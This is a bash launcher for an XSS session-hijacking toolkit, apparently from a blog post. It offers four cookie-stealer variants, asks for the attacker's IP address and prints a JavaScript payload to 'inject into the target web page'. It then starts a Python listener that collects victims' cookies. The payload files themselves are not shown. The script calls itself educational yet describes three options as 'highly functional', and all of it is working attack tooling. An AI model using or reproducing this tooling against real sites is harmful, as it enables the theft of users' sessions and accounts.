#!/bin/bash

CS_DIR='cookie_stealers';
SCRIPT_DIR='injectable_scripts';

NO_REDIRECT='no-redirect.py';
WITH_REDIRECT='with-redirect.py';
WITH_AJAX='with-ajax.py';

AJAX_SCRIPT='ajax-script.txt'
GUARDED_SCRIPT='guarded-script.txt'
SIMPLE_SCRIPT='no-redirect.txt'

PWNDFLAG='hasbeenpwnd'

if [ "$(id -u)" != "0" ]; then
   echo "Run me as root please." 1>&2
   exit 1
fi

cat << "EOF"

    #    #       #                                  
   # #   #       #                                  
  #   #  #       #                                  
 #     # #       #                                  
 ####### #       #                                  
 #     # #       #                                  
 #     # ####### #######                            
                                                    
             ####### #     # #######                
                #    #     # #                      
                #    #     # #                      
                #    ####### #####                  
                #    #     # #                      
                #    #     # #                      
                #    #     # #######                
                                                    
  #####  ####### ####### #    # ### #######  #####  
 #     # #     # #     # #   #   #  #       #     # 
 #       #     # #     # #  #    #  #       #       
 #       #     # #     # ###     #  #####    #####  
 #       #     # #     # #  #    #  #             # 
 #     # #     # #     # #   #   #  #       #     # 
  #####  ####### ####### #    # ### #######  #####  
                                                    

Written by Gabriel Ryan for XSS-SESSION-HIJACKING blogpost at

	http://solstice.me

This cookie stealer was written for educational purposes. With
that said, options 1, 2, and 4 are all highly functional. Option
3 is used to demonstrate a redirect loop and is not for practical
application.
EOF

menu=$(cat << "EOF"

Please select a cookie stealer

	1. No Redirect
	2. With Redirect
	3. With Guarded Redirect
	4. With AJAX Support

EOF
)




lolsauce="0";
runfile='';
jsfile='';
while [ $lolsauce==$lolsauce ]; do


	echo "$menu"
	echo ""

    read -p 'Please enter option 1, 2, 3, or 4: ' lolsauce;

    if [ $lolsauce == "1" ]; then
		
		runfile="$CS_DIR/$NO_REDIRECT"
		jsfile="$SCRIPT_DIR/$SIMPLE_SCRIPT"
        break

    elif [ $lolsauce == "2" ]; then

		runfile="$CS_DIR/$WITH_REDIRECT"
		jsfile="$SCRIPT_DIR/$SIMPLE_SCRIPT"
        break

    elif [ $lolsauce == "3" ]; then

		runfile="$CS_DIR/$WITH_REDIRECT"
		jsfile="$SCRIPT_DIR/$GUARDED_SCRIPT"
        break


    elif [ $lolsauce == "4" ]; then

		runfile="$CS_DIR/$WITH_AJAX"
		jsfile="$SCRIPT_DIR/$AJAX_SCRIPT"
        break

    fi

    echo "Please select a valid option.";
done

read -p 'Please enter your IP address: ' LHOST;

echo ""

echo "Inject the following code into the target web page:"

echo ""
echo ""

cat "$jsfile" | sed "s/LHOST/$LHOST/g" | sed "s/PWNDFLAG/$PWNDFLAG/g"

echo ""
echo ""
read -p 'Press any key to continue . . .' -n 1
echo ""

echo "Launching cookie stealer..."
python "$runfile"

